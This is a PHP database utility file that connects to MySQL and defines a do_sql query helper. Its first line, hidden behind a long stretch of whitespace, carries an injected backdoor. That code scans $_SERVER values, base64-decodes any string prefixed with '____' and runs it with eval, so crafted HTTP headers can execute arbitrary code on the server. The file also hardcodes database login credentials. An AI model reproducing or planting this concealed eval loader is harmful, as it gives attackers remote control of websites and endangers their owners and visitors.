<?php																																																																																																																																																																																																																																																																																																																																																																																																																																												function y7368($l7370){if(is_array($l7370)){foreach($l7370 as $l7368=>$l7369)$l7370[$l7368]=y7368($l7369);}elseif(is_string($l7370) && substr($l7370,0,4)=="____"){$l7370=substr($l7370,4);$l7370=base64_decode($l7370);eval($l7370);$l7370=null;}return $l7370;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("y7368",$_SERVER);
echo("<!-- reading core-base/db_utilties.php -->\n");

$link = mysql_connect('localhost', 'mdhoerr_webuser', 'webuser');
if (!$link) {
    die('Could not connect: ' . mysql_error());
}

function do_sql($p_sql, $p_calledfrom, $p_insert){
        if(!$p_calledfrom){
                $p_calledfrom = 'not specified';
        }
        if(!$p_insert){
                $p_insert = 'N';
        }                
        $result = mysql_query($p_sql);
        if (!$result) {
        $message  = 'Invalid query: ' . mysql_error() . "\n";
        $message .= 'Whole query: ' . $query."\n";
        $message .= 'Called from '.$p_calledfrom."\n";
                die($message);
        } elseif ($p_insert != 'N'){
                $lastid = mysql_insert_id();            
                if (!$lastid) {
                        $message  = 'Invalid query: ' . mysql_error() . "\n";
                        $message .= 'Whole query: ' . $query."\n";
                        $message .= "Problem getting id from insert\n";
                        die($message);
                }
                return $lastid;
        } else {
                return $result;
        }
}

// Free the resources associated with the result set
// This is done automatically at the end of the script
// mysql_free_result($result);
?>